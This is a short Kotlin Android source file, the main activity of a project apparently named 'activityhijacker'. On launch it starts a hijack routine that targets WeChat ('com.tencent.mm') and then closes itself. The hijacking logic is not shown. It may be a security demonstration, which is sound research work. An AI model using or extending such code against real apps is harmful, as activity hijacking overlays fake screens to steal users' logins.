package io.ivan.activityhijacker.activity

import android.content.Intent
import android.os.Bundle
import android.support.v7.app.AppCompatActivity
import io.ivan.activityhijacker.Hijack
import io.ivan.activityhijacker.service.HijackingService

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Hijack.start(this,"com.tencent.mm")
        finish()
    }

}
